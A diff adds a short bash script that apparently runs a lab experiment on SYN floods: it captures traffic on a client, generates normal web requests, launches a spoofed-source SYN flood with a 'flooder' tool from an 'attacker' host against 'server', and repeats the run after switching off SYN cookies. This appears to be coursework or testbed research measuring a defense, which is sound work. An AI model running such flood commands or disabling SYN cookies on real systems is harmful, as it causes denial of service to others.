@@ -1,0 +1,55 @@
+#!/bin/bash
+
+set -e
+
+run_exp() {
+
+    if [ "$1" = "" ]; then
+        echo "specify output file when calling run_exp"
+        exit 1
+    fi
+
+    # record tcpdump
+    ssh client "sudo tcpdump -nn -i eth1 -w /home/$(whoami)/results.pcap" &
+    tcpdumpPid=$!
+
+    # Start legit traffic
+    ssh client "while true; do curl server/index.html > /dev/null; echo ''; echo 'pulling from server'; sleep 1; done" &
+    whilePid=$!
+
+    sleep 30
+
+    # Run the attack
+    ssh attacker "sudo flooder --dst server --src 1.2.0.0 --srcmask 255.255.0.0 --highrate 150 --proto 6 " &
+    attackPid=$!
+
+    # take data
+    sleep 120
+
+    sudo kill $attackPid
+
+    sleep 30
+
+    # kill and record everything
+    sudo kill $whilePid
+
+    sudo kill $tcpdumpPid
+
+    scp client:/home/$(whoami)/results.pcap $1
+}
+
+
+# Pause for a second while baselines records
+sleep 10
+
+run_exp ./with-syn.pcap
+
+# disable syn cookies
+ssh server "sudo sysctl -w net.ipv4.tcp_syncookies=0"
+ssh server "sudo sysctl -w net.ipv4.tcp_max_syn_backlog=10000"
+
+run_exp ./no-syn.pcap
+
+# pause to record another baseline
+sleep 10
+
